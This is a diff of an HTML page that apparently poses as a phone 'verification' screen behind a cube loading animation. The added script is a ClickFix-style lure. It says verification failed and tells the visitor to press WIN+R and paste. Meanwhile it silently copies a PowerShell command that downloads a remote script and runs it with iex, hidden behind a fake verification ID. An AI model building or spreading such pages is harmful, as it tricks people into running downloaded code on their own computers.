@@ -1,89 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Loading Screen</title>
     <style>
-        body {
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-        #loading-screen {
-            display: grid;
-            grid-template-columns: repeat(3, 50px);
-            grid-gap: 5px;
-        }
-        .cube {
-            width: 50px;
-            height: 50px;
-            animation: resize 1.5s linear infinite;
-        }
-        .cube:not(:first-child) {
-            animation-delay: 0.2s;
-        }
-        @keyframes resize {
-            0%, 100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(0.5);
-            }
-        }
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #fff;
+        font-family: Arial, sans-serif;
+      }
+      .cube-loader {
+        width: 100px;
+        height: 100px;
+        display: flex;
+        flex-wrap: wrap;
+      }
+      .cube {
+        width: 33.33%;
+        height: 33.33%;
+        animation: scaleCube 2.6s infinite ease-in-out;
+      }
+      .cube:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .cube:nth-child(2) {
+        animation-delay: 0.1s;
+      }
+      .cube:nth-child(3) {
+        animation-delay: 0.2s;
+      }
+      .cube:nth-child(4) {
+        animation-delay: 0.1s;
+      }
+      .cube:nth-child(5) {
+        animation-delay: 0.2s;
+      }
+      .cube:nth-child(6) {
+        animation-delay: 0.3s;
+      }
+      .cube:nth-child(7) {
+        animation-delay: 0.2s;
+      }
+      .cube:nth-child(8) {
+        animation-delay: 0.3s;
+      }
+      .cube:nth-child(9) {
+        animation-delay: 0.4s;
+      }
 
-        #verification-page {
-            display: none;
-            text-align: center;
+      @keyframes scaleCube {
+        0%,
+        70%,
+        100% {
+          transform: scale3D(1, 1, 1);
         }
-        #verification-page h1 {
-            font-size: 24px;
-            color: #333;
+        35% {
+          transform: scale3D(0, 0, 1);
         }
-        #verification-page a {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #3498db;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 5px;
-            font-size: 18px;
-        }
-        #verification-page a:hover {
-            background-color: #2980b9;
-        }
+      }
+
+      #verification-page {
+        display: none;
+        text-align: center;
+      }
+      #verification-page h1 {
+        font-size: 24px;
+        color: #333;
+      }
+      #verification-page a {
+        display: inline-block;
+        margin-top: 20px;
+        padding: 10px 20px;
+        background-color: #3498db;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+        font-size: 18px;
+      }
+      #verification-page a:hover {
+        background-color: #2980b9;
+      }
     </style>
-</head>
-<body>
-    <div id="loading-screen">
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
-        <div class="cube"></div>
+  </head>
+  <body>
+    <div class="cube-loader" id="loading-screen">
+      <div class="cube" id="cube1"></div>
+      <div class="cube" id="cube2"></div>
+      <div class="cube" id="cube3"></div>
+      <div class="cube" id="cube4"></div>
+      <div class="cube" id="cube5"></div>
+      <div class="cube" id="cube6"></div>
+      <div class="cube" id="cube7"></div>
+      <div class="cube" id="cube8"></div>
+      <div class="cube" id="cube9"></div>
     </div>
     <div id="verification-page">
-        <h1>Click Here to Verify that your phone is Happy</h1>
-        <a href="#">Click Here</a>
+      <h1>Click Here to Verify that your phone is Happy</h1>
+      <a href="#">Click Here</a>
     </div>
     <script>
-        setTimeout(() => {
-            document.getElementById('loading-screen').style.display = 'none';
-            document.getElementById('verification-page').style.display = 'block';
+      window.onload = function () {
+        var colors = [
+          "#FF5733",
+          "#33FF57",
+          "#3357FF",
+          "#F333FF",
+          "#33FFF3",
+          "#FF33A1",
+          "#A1FF33",
+          "#FF3333",
+          "#33FFA1",
+          "#ABCDEF",
+          "#FEDCBA",
+          "#C0FFEE",
+          "#BADA55",
+          "#123456",
+          "#654321"
+        ];
+        for (var i = 1; i <= 9; i++) {
+          document.getElementById("cube" + i).style.backgroundColor =
+            colors[Math.floor(Math.random() * colors.length)];
+        }
+
+        setTimeout(function () {
+          document.getElementById("loading-screen").style.display = "none";
+          document.getElementById("verification-page").style.display = "block";
         }, 3500);
-        
-        document.querySelectorAll('.cube').forEach(cube => {
-            cube.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+
+        // New event listener for the "Click Here" button
+        document.querySelector('#verification-page a').addEventListener('click', function(e) {
+          e.preventDefault();
+          var vp = document.getElementById('verification-page');
+          vp.innerHTML = '<h1>Verifying...</h1>';
+          setTimeout(function(){
+            vp.innerHTML =
+              '<h1>Verification Failed</h1>' +
+              '<p>We failed to verify that your phone was happy.</p>' +
+              '<p>Please press WIN+R, then paste the text that has been copied in the Run dialog, and press Enter to confirm that your phone is happy.</p>';
+            navigator.clipboard.writeText('powershell -c "irm bun.sh/install.ps1 | iex" # Verification ID ✅: 20KM8B9M30PF8MN8301BD34F7FUY5BB8A900C').catch(function(err){
+              console.error("Clipboard error:", err);
+            });
+          }, 2000);
         });
+      };
     </script>
-</body>
+  </body>
 </html>
